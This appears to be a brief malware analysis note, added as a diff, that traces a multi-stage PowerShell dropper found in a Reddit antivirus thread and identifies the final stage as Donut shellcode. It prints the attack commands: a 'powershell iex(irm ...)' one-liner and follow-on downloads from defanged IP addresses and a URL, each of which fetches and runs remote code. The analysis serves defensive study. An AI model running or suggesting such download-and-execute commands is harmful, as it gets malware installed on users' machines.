@@ -1,0 +1,19 @@
+
+File / Link found in reddit thread : https://www.reddit.com/r/antivirus/comments/1qy529j/very_tech_illiterate_very_paranoid_ran_a/ 
+Command ran : 
+STEP 1: 
+
+powershell -c iex(irm 158[.]94[.]209[.]33 -UseBasicParsing) 
+IEX -> Invoke Expression 
+IRM -> Invoke Rest Method      
+First Step download a second script for [redacted] 
+
+from there the second payload download a third one 
+$finalPayload = iwr -Uri "178[.]16[.]53[.]70" -UseBasicParsing 
+
+the third part will download a $u = "hxxp[://]94[.]154[.]35[.]115/user_profiles_photo/cptch[.]bin"
+Identified as a DONUT shellcode in 0.9.2 and load it inside a thread for execution 
+
+Reading the source code for DONUT 0.9.2 we can see the first byte any shellcode should be an OPCODE of 0xE8 
+
+For now only UNDONUT work in static but ... for donut 0.9.3 and there was a lot of change in between versions.
